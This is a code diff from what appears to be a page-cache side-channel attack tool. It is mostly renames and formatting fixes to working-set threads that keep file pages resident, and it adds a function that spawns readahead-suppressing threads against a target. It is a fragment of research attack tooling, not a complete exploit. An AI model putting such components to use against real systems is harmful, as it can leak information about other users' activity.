-    files_per_thread = ws->resident_files_.count_ / ws->access_thread_count_;
+    files_per_thread_floor = ws->resident_files_.count_ / ws->access_thread_count_;
     // prepare thread_data objects
     for (t = 0; t < ws->access_thread_count_ - 1; t++)
     {
-        PageAccessThreadData *thread_data = dynArrayGet(&ws->access_threads_, t);
+        PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);
         // prepare fake lists
         thread_data->sleep_time_ = ws->access_sleep_time_;
         thread_data->resident_files_.head_ = current_head;
-        thread_data->resident_files_.count_ = files_per_thread;
+        thread_data->resident_files_.count_ = files_per_thread_floor;
 
-        processed_files += files_per_thread;
+        processed_files += files_per_thread_floor;
         current_head = listGetIndex(&ws->resident_files_, processed_files);
     }
-
-    PageAccessThreadData *thread_data = dynArrayGet(&ws->access_threads_, t);
     // prepare thread_data object for last thread
+    PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);
     thread_data->sleep_time_ = ws->access_sleep_time_;
     thread_data->resident_files_.head_ = current_head;
     thread_data->resident_files_.count_ = ws->resident_files_.count_ - processed_files;
@@ -1854,9 +2141,9 @@ error:
     return -1;
 }
 
-void *pageAccessThread(void *arg)
+void *pageAccessThreadWS(void *arg)
 {
-    PageAccessThreadData *page_thread_data = arg;
+    PageAccessThreadWSData *page_thread_data = arg;
     volatile uint8_t tmp = 0;
     ListNode *resident_files_node = NULL;
     CachedFile *current_cached_file = NULL;
@@ -1864,7 +2151,7 @@ void *pageAccessThread(void *arg)
     size_t resident_sequences_length = 0;
     size_t accessed_pages_count = 0;
     size_t accessed_files_count = 0;
-    (void) tmp;
+    (void)tmp;
 
     while (__atomic_load_n(&page_thread_data->running_, __ATOMIC_RELAXED))
     {
@@ -1882,10 +2169,10 @@ void *pageAccessThread(void *arg)
 #ifdef WS_MAP_FILE
             // advise random access to avoid readahead
             madvise(current_cached_file->addr_, current_cached_file->size_, MADV_RANDOM);
-#else 
+#else
             // advise random access to avoid readahead
-            posix_fadvise(current_cached_file->fd_, 0, 0, POSIX_FADV_RANDOM); 
-#endif 
+            posix_fadvise(current_cached_file->fd_, 0, 0, POSIX_FADV_RANDOM);
+#endif
 
             resident_sequences = current_cached_file->resident_page_sequences_.data_;
             resident_sequences_length = current_cached_file->resident_page_sequences_.size_;
@@ -1896,18 +2183,18 @@ void *pageAccessThread(void *arg)
                 {
                     //printf("Accessing offset %zu, %zu length\n", resident_sequences[s].offset_, resident_sequences[s].length_);
 #ifdef WS_MAP_FILE
-                    tmp = *((uint8_t *) current_cached_file->addr_ + p * PAGE_SIZE);
+                    tmp = *((uint8_t *)current_cached_file->addr_ + p * PAGE_SIZE);
 #else
                     if (pread(current_cached_file->fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
                     {
                         printf(WARNING WS_MGR_TAG "Error (%s) at pread...\n", strerror(errno));
                     }
-    #ifdef PREAD_TWO_TIMES
+#ifdef PREAD_TWO_TIMES
                     if (pread(current_cached_file->fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
                     {
                         printf(WARNING WS_MGR_TAG "Error (%s) at pread...\n", strerror(errno));
                     }
-    #endif
+#endif
 #endif
                     accessed_pages_count++;
                 }
@@ -1929,6 +2216,29 @@ void *pageAccessThread(void *arg)
     }
 
     return NULL;
+}
+
+int spawnSuppressThreads(Attack *attack, pthread_attr_t *thread_attr)
+{
+    // readahead surpressing threads for target
+    for (size_t t = 0; t < attack->ss_thread_count_; t++)
+    {
+        pthread_t tid;
+
+        // by default run on a different core if possible
+        if (pthread_create(&tid, thread_attr, suppressThread, (void *)&attack->suppress_set_) != 0)
+        {
+            printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
+            return -1;
+        }
+        if (!dynArrayAppend(&attack->ss_threads_, &tid))
+        {
+            printf(FAIL "Error at dynArrayAppend...\n");
+            return -1;
+        }
+    }
+
+    return 0;
 }
 
 void *suppressThread(void *arg)
